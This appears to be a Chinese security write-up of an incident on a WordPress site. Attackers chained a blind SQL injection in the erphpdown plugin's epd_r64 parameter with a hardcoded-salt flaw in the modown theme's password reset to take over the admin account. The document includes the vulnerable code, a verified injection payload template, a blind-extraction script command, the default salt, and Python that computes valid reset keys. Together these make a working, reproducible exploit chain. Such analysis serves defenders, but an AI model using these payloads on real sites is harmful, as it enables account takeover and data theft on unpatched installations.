2026-10-31，多个来源 IP 对该站反复执行密码重置，并复用了同一个重置 key。日志显示攻击者全程使用 curl 直连，路径高度固定：GET /wp-login.php  
 触发找回 → GET /login?action=reset_password&key=...&login=admin  
 拿到有效重置表单 → POST /wp-login.php  
 改密。  
  
攻击链一句话：**用 epd_r64 注入把数据库里 wp_users.user_activation_key 读出来，再按 modown 的公式 md5(盐 + key) 本地算出重置链接 key，就能合法走通重置密码流程。**  
## 二、攻击链全貌  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ic8IL4XPhV1IgJEUIXica1vERibBnTEJxtjBFHZdyCmnl96Y26Sh89HRicwgRoHZUbQkpOFLImazQINpTuU7McuiatwjSJJ6Jvx4AicaYRAOX2NJY/640?wx_fmt=png&from=appmsg "")  
  
  
两个关键事实：  
1. 1. **key 可读**  
：user_activation_key  
 存在 wp_users  
 表，且 erphpdown 插件存在可注入点，任何登录用户都能把它读出来。  
  
1. 2. **key 可算**  
：modown 重置校验用的是 md5(硬编码盐 + key)  
，盐是公开常量，攻击者离线即可算出合法重置 key。

## 三、漏洞审计  
### 3.1 漏洞 1：erphpdown epd_r64 SQL 注入  
  
**文件**  
：wp-content/plugins/erphpdown/includes/pay.erphp.php  
  
**入口函数 _epd_r64()（L420-427，挂 init，任意页面可触发）**  
：  
```
add_filter('init', '_epd_r64', 10);function _epd_r64(){    if(isset($_GET['epd_r64']) && $_GET['epd_r64']){        ...        global $wpdb;        $epd_v64 = base64_decode($_GET['epd_r64']);      // ① 无过滤解码        $epd_v64_arr = explode('-', $epd_v64);           // ② 按"-"切3段        if(is_array($epd_v64_arr) && count($epd_v64_arr) == 3){            $method = $epd_v64_arr[0];                    // ③ 第1段=支付方式=用户可控            $price  = $epd_v64_arr[1];            if(time()-$epd_v64_arr[2] > 60*30){          // ④ 第3段须为当前时间戳(30分钟内)                wp_die("链接已过期！");            }            ...            $epd_order = _epd_create_page_order($method, 'r', $price);  // ⑤ $method 直接传入
```  
  
**SQL 拼接点（L407-408）**  
：  
```
$sql="INSERT INTO $wpdb->icemoney (...,ice_alipay,...) VALUES    (...,'$payment',...)";          // $payment = $method，未转义$a=$wpdb->query($sql);
```  
  
**成因**  
：  
- • base64_decode  
 后没有任何转义 / 过滤；  
  
- • 第 1 段 $method  
 原样传入 _epd_create_page_order()  
，最终未转义拼接进 INSERT；  
  
- • 攻击者用 x',IF((条件),SLEEP(2),1),3,4)#  
 闭合引号、替换列值、#  
 注释尾部，构成时间盲注。  
  
**触发模板**  
（第 3 段时间戳必须实时生成）：  
```
epd_r64 = base64("x',IF((条件),SLEEP(2),1),3,4)#-10-<当前unix时间戳>")GET /?epd_r64=<URL编码后的base64>&ice_type=1
```  
  
**登录检查**  
：_epd_create_page_order()  
 内有两次 "请先登录" 拦截（L27 无 post/type/ 未登录；L239 VIP 分支未开且未登录）。**匿名请求会被 500 拦截，必须携带任意已登录用户的 Cookie 才能到达注入点**  
（本次复现已验证）。  
### 3.2 漏洞 2：modown 主题密码重置逻辑缺陷  
  
**文件**  
：wp-content/themes/modown/action/login.php  
  
**生成 key（L199-205，**action=password**）**  
：向 wp_users.user_activation_key  
 写入随机 key，同时发找回邮件。  
  
**校验并改密（L220-249，**action=reset**）**  
：  
```
// 校验：md5($md5_str . user_activation_key) == 传入的 reset_keyif(md5($md5_str.$user_data->user_activation_key) == $reset_key){    wp_set_password($new_password, $user_id);   // 直接改密}
```  
  
**关键缺陷**  
：  
- • 盐 $md5_str  
 默认硬编码 M2O7B4A8N5T9U0  
（后台选项 login_password_key  
 可覆盖，但多数站点未设置）；  
  
- • 重置 key 公式公开可算：重置key = md5(SALT + user_activation_key)  
；  
  
- • 只要攻击者能拿到 user_activation_key

## 五、复现方式（已验证）  
### 5.1 前置条件  
1. 1. 站点存在未升级的 erphpdown 插件（pay.erphp.php  
 含 407 行未转义拼接）；  
  
1. 2. **注册任意普通用户并登录**  
，取得 Cookie（wordpress_logged_in_*  
、PHPSESSID  
）—— 注入点要求登录态；  
  
1. 3. 目标：wp_users.ID=1  
（管理员 admin）。  
  
### 5.2 注入点自检  
```
IF((1=1),SLEEP(2),1) → 响应 ~2s（慢）IF((1=2),SLEEP(2),1) → 响应 <1s（快）
```  
  
慢 / 快差异 = 注入存在。  
### 5.3 盲注提取（脚本 epd_r64_blind_extract.py）  
```
python epd_r64_blind_extract.py `  --cookie "wordpress_logged_in_xxx=值; PHPSESSID=值" `  --where "ID=1" --length 64
```  
  
脚本特性：  
- • 时间戳每次请求实时生成（满足 30 分钟窗口）；  
  
- • 自动 base64 + URL 编码；  
  
- • 注入点自检（--no-probe  
 可跳过）；  
  
- • 二分提取 ASCII 32-126，逐字符 / 逐字段；  
  
- • 表 / 字段 / WHERE 全参数化，可提任意内容。  
  
### 5.4 离线算重置 key  
```
import hashlibSALT = "M2O7B4A8N5T9U0"                      # 后台未设 login_password_key 时为默认盐key  = "<提取出的 user_activation_key>"reset_key = hashlib.md5((SALT + key).encode()).hexdigest()print(reset_key)
```  
